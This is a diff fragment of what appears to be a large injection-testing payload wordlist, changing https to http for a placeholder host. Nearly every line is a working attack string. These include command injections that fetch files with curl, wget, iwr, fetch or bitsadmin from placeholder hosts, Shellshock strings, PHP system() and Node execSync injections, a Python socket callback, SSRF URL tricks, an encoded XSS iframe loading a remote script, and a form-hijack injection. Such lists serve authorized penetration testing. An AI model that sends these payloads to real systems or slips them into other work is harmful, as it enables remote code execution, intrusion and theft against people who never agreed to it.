+'fetch http://vps_ip:80/fetch.txt&
+'fetch http://vps_ip:80/fetch.txt&&
+'fetch http://vps_ip:80/fetch.txt;
+'fetch http://vps_ip:80/fetch.txt|
+'fetch http://vps_ip:80/fetch.txt||
+(fetch http://vps_ip:80/fetch.txt)
+;fetch http://vps_ip:80/fetch.txt#
+;fetch http://vps_ip:80/fetch.txt&
+;fetch http://vps_ip:80/fetch.txt&&
+;fetch http://vps_ip:80/fetch.txt;
+;fetch http://vps_ip:80/fetch.txt|
+;fetch http://vps_ip:80/fetch.txt||
+`fetch http://vps_ip:80/fetch.txt`
+{fetch http://vps_ip:80/fetch.txt}
+||fetch http://vps_ip:80/fetch.txt#
+||fetch http://vps_ip:80/fetch.txt&
+||fetch http://vps_ip:80/fetch.txt&&
+||fetch http://vps_ip:80/fetch.txt;
+||fetch http://vps_ip:80/fetch.txt|
+||fetch http://vps_ip:80/fetch.txt||
+|fetch http://vps_ip:80/fetch.txt#
+|fetch http://vps_ip:80/fetch.txt&
+|fetch http://vps_ip:80/fetch.txt&&
+|fetch http://vps_ip:80/fetch.txt;
+|fetch http://vps_ip:80/fetch.txt|
+|fetch http://vps_ip:80/fetch.txt||
+fetch http://vps_ip:80/fetch.txt
+fetch http://vps_ip:80/fetch.txt#
+fetch http://vps_ip:80/fetch.txt&
+fetch http://vps_ip:80/fetch.txt&&
+fetch http://vps_ip:80/fetch.txt;
+fetch http://vps_ip:80/fetch.txt|
+fetch http://vps_ip:80/fetch.txt||
+"fetch http://vps_ip:80/fetch.txt%00
+&&fetch http://vps_ip:80/fetch.txt%00
+&fetch http://vps_ip:80/fetch.txt%00
+'fetch http://vps_ip:80/fetch.txt%00
+;fetch http://vps_ip:80/fetch.txt%00
+||fetch http://vps_ip:80/fetch.txt%00
+|fetch http://vps_ip:80/fetch.txt%00
+fetch http://vps_ip:80/fetch.txt%00
 file://0://domain_collab;http://google.com/
 file://0://srff2.domain_collab;http://google.com:80/
 file://0://vps_ip:80;http://google.com/
@@ -3416,7 +3416,7 @@ https://simplessrf.domain_collab
 http://ssrf1.domain_collab$google.com
 https://ssrf1.domain_collab$google.com
 https://vps_ip
-https://vps_ip:80
+http://vps_ip:80
 http://vps_ip
 http://vps_ip:80
 "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;crimson.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
@@ -3553,66 +3553,66 @@ iwr https://domain_collab/iwr.txt -OutFile iwr.txt||
 ||iwr https://domain_collab/iwr.txt -OutFile iwr.txt%00
 |iwr https://domain_collab/iwr.txt -OutFile iwr.txt%00
 iwr https://domain_collab/iwr.txt -OutFile iwr.txt%00
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-(iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt)
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-`iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt`
-{iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt}
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-"iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-&&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-&iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-'iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-;iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-||iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-|iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
-iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+(iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt)
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+`iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt`
+{iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt}
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+"iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+&&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+&iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+'iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+;iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+||iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+|iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
 jar://0://domain_collab;http://google.com/
 jar://0://srff2.domain_collab;http://google.com:80/
 jar://0://vps_ip:80;http://google.com/
@@ -4810,13 +4810,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \n() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt|
 \n() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt||
 \n() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt%00
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-\n() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+\n() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
 \n() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt#
 \n() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt&
 \n() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt&&
@@ -4824,13 +4824,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \n() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt|
 \n() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt||
 \n() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt%00
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-\n() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+\n() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
 \nbitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt#
 \nbitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt&
 \nbitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt&&
@@ -4838,13 +4838,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \nbitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt|
 \nbitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt||
 \nbitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt%00
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-\nbitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+\nbitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
 \ncurl https://domain_collab/rce_curl.txt#
 \ncurl https://domain_collab/rce_curl.txt&
 \ncurl https://domain_collab/rce_curl.txt&&
@@ -4852,13 +4852,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \ncurl https://domain_collab/rce_curl.txt|
 \ncurl https://domain_collab/rce_curl.txt||
 \ncurl https://domain_collab/rce_curl.txt%00
-\ncurl https://vps_ip:80/rce_curl.txt#
-\ncurl https://vps_ip:80/rce_curl.txt&
-\ncurl https://vps_ip:80/rce_curl.txt&&
-\ncurl https://vps_ip:80/rce_curl.txt;
-\ncurl https://vps_ip:80/rce_curl.txt|
-\ncurl https://vps_ip:80/rce_curl.txt||
-\ncurl https://vps_ip:80/rce_curl.txt%00
+\ncurl http://vps_ip:80/rce_curl.txt#
+\ncurl http://vps_ip:80/rce_curl.txt&
+\ncurl http://vps_ip:80/rce_curl.txt&&
+\ncurl http://vps_ip:80/rce_curl.txt;
+\ncurl http://vps_ip:80/rce_curl.txt|
+\ncurl http://vps_ip:80/rce_curl.txt||
+\ncurl http://vps_ip:80/rce_curl.txt%00
 \necho INJECTX\nexit\n\033[2Acurl https://domain_collab/.testing/rce_vuln.txt\n
 \necho INJECTX\nexit\n\033[2Awget https://domain_collab/.testing/rce_vuln.txt\n
 \nfetch https://domain_collab/fetch.txt#
@@ -4868,13 +4868,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \nfetch https://domain_collab/fetch.txt|
 \nfetch https://domain_collab/fetch.txt||
 \nfetch https://domain_collab/fetch.txt%00
-\nfetch https://vps_ip:80/fetch.txt#
-\nfetch https://vps_ip:80/fetch.txt&
-\nfetch https://vps_ip:80/fetch.txt&&
-\nfetch https://vps_ip:80/fetch.txt;
-\nfetch https://vps_ip:80/fetch.txt|
-\nfetch https://vps_ip:80/fetch.txt||
-\nfetch https://vps_ip:80/fetch.txt%00
+\nfetch http://vps_ip:80/fetch.txt#
+\nfetch http://vps_ip:80/fetch.txt&
+\nfetch http://vps_ip:80/fetch.txt&&
+\nfetch http://vps_ip:80/fetch.txt;
+\nfetch http://vps_ip:80/fetch.txt|
+\nfetch http://vps_ip:80/fetch.txt||
+\nfetch http://vps_ip:80/fetch.txt%00
 \nimport os,pty,socket;s=socket.socket();s.connect(("vps_ip",80));s.send(b"python_rce")#
 \nimport os,pty,socket;s=socket.socket();s.connect(("vps_ip",80));s.send(b"python_rce")&
 \nimport os,pty,socket;s=socket.socket();s.connect(("vps_ip",80));s.send(b"python_rce")&&
@@ -4889,13 +4889,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \niwr https://domain_collab/iwr.txt -OutFile iwr.txt|
 \niwr https://domain_collab/iwr.txt -OutFile iwr.txt||
 \niwr https://domain_collab/iwr.txt -OutFile iwr.txt%00
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-\niwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+\niwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
 "><noscript><form action=http://domain_collab><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
 "><noscript><form action=http://vps_ip:80><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
 \nping domain_collab#
@@ -4952,13 +4952,13 @@ MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
 \nwget https://domain_collab/rce_curl.txt|
 \nwget https://domain_collab/rce_curl.txt||
 \nwget https://domain_collab/rce_curl.txt%00
-\nwget https://vps_ip:80/rce_curl.txt#
-\nwget https://vps_ip:80/rce_curl.txt&
-\nwget https://vps_ip:80/rce_curl.txt&&
-\nwget https://vps_ip:80/rce_curl.txt;
-\nwget https://vps_ip:80/rce_curl.txt|
-\nwget https://vps_ip:80/rce_curl.txt||
-\nwget https://vps_ip:80/rce_curl.txt%00
+\nwget http://vps_ip:80/rce_curl.txt#
+\nwget http://vps_ip:80/rce_curl.txt&
+\nwget http://vps_ip:80/rce_curl.txt&&
+\nwget http://vps_ip:80/rce_curl.txt;
+\nwget http://vps_ip:80/rce_curl.txt|
+\nwget http://vps_ip:80/rce_curl.txt||
+\nwget http://vps_ip:80/rce_curl.txt%00
 ogg://0://domain_collab;http://google.com/
 ogg://0://srff2.domain_collab;http://google.com:80/
 ogg://0://vps_ip:80;http://google.com/
@@ -5536,21 +5536,21 @@ phar://ssrf1.domain_collab$google.com
 phar://vps_ip
 phar://vps_ip:80
 <?php system("bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt");?>
-<?php system("bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt");?>
+<?php system("bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt");?>
 <?php system("curl https://domain_collab/rce_curl.txt");?>
 <?php system("curl https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("curl https://domain_collab/.testing/rce_vuln.txt?req=df2fkjj");?>
-<?php system("curl https://vps_ip:80/rce_curl.txt");?>
+<?php system("curl http://vps_ip:80/rce_curl.txt");?>
 <?php system("fetch https://domain_collab/fetch.txt");?>
-<?php system("fetch https://vps_ip:80/fetch.txt");?>
+<?php system("fetch http://vps_ip:80/fetch.txt");?>
 <?php system("iwr https://domain_collab/iwr.txt -OutFile iwr.txt");?>
-<?php system("iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt");?>
+<?php system("iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt");?>
 <?php system("ping domain_collab");?>
 <?php system("ping vps_ip");?>
 <?php system("wget https://domain_collab/rce_curl.txt");?>
 <?php system("wget https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("wget https://domain_collab/.testing/rce_vuln.txt?retepq=jdfj2jc");?>
-<?php system("wget https://vps_ip:80/rce_curl.txt");?>
+<?php system("wget http://vps_ip:80/rce_curl.txt");?>
 &&ping${IFS}-c2${IFS}domain_collab
 &ping${IFS}-c2${IFS}domain_collab
 ;ping${IFS}-c2${IFS}domain_collab
@@ -8643,7 +8643,7 @@ ssh2://vps_ip:80
 \\ssrf.domain_collab\c$
 \\ssrf.domain_collab\share
 system'(bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt')
-system'(bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt')
+system'(bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt')
 system'(curl https://domain_collab/rce_curl.txt')
 & system('curl https://domain_collab/.testing/rce_vuln.txt');
 && system('curl https://domain_collab/.testing/rce_vuln.txt');
@@ -8653,13 +8653,13 @@ system'(curl https://domain_collab/rce_curl.txt')
 system('curl https://domain_collab/.testing/rce_vuln.txt')
 system('curl https://domain_collab/.testing/rce_vuln.txt');
 system('curl https://domain_collab/.testing/rce_vuln.txt?req=22fd2wdf')
-system'(curl https://vps_ip:80/rce_curl.txt')
+system'(curl http://vps_ip:80/rce_curl.txt')
 @(System.Diagnostics.Process.Start("cmd.exe","/c ping domain_collab"));
 @(System.Diagnostics.Process.Start("cmd.exe","/c ping vps_ip"));
 system'(fetch https://domain_collab/fetch.txt')
-system'(fetch https://vps_ip:80/fetch.txt')
+system'(fetch http://vps_ip:80/fetch.txt')
 system'(iwr https://domain_collab/iwr.txt -OutFile iwr.txt')
-system'(iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt')
+system'(iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt')
 <%= system("ping domain_collab") %>
 system'(ping domain_collab')
 <%= system("ping vps_ip") %>
@@ -8667,7 +8667,7 @@ system'(ping vps_ip')
 system'(wget https://domain_collab/rce_curl.txt')
 system('wget https://domain_collab/.testing/rce_vuln.txt');
 system('wget https://domain_collab/.testing/rce_vuln.txt?req=22fd2w23')
-system'(wget https://vps_ip:80/rce_curl.txt')
+system'(wget http://vps_ip:80/rce_curl.txt')
 "><table background='//domain_collab?'
 "><table background='//vps_ip:80?'
 telnet://0://domain_collab;http://google.com/
@@ -8691,19 +8691,19 @@ tftp://ssrf1.domain_collab$google.com
 tftp://vps_ip
 tftp://vps_ip:80
 ){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("curl domain_collab/rce")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("curl https://domain_collab/rce_curl.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("curl https://vps_ip:80/rce_curl.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("curl http://vps_ip:80/rce_curl.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("curl vps_ip:80/rce")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("fetch https://domain_collab/fetch.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("fetch https://vps_ip:80/fetch.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("fetch http://vps_ip:80/fetch.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("iwr https://domain_collab/iwr.txt -OutFile iwr.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("ping domain_collab")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("ping vps_ip")}; with(obj
 ){this.global.process.mainModule.require("child_process").execSync("wget https://domain_collab/rce_curl.txt")}; with(obj
-){this.global.process.mainModule.require("child_process").execSync("wget https://vps_ip:80/rce_curl.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("wget http://vps_ip:80/rce_curl.txt")}; with(obj
  \u0026curl domain_collab"
  \u0026n\"s\"l\"o\"o\"k\"u\"p\" domain_collab"
  \u0026nslookup domain_collab"
@@ -9329,66 +9329,66 @@ wget https://domain_collab/rce_curl.txt%00
 && wget https://domain_collab/.testing/rce_vuln.txt
 ; wget https://domain_collab/.testing/rce_vuln.txt
 wget https://domain_collab/.testing/rce_vuln.txt
-"wget https://vps_ip:80/rce_curl.txt#
-"wget https://vps_ip:80/rce_curl.txt&
-"wget https://vps_ip:80/rce_curl.txt&&
-"wget https://vps_ip:80/rce_curl.txt;
-"wget https://vps_ip:80/rce_curl.txt|
-"wget https://vps_ip:80/rce_curl.txt||
-&&wget https://vps_ip:80/rce_curl.txt#
-&&wget https://vps_ip:80/rce_curl.txt&
-&&wget https://vps_ip:80/rce_curl.txt&&
-&&wget https://vps_ip:80/rce_curl.txt;
-&&wget https://vps_ip:80/rce_curl.txt|
-&&wget https://vps_ip:80/rce_curl.txt||
-&wget https://vps_ip:80/rce_curl.txt#
-&wget https://vps_ip:80/rce_curl.txt&
-&wget https://vps_ip:80/rce_curl.txt&&
-&wget https://vps_ip:80/rce_curl.txt;
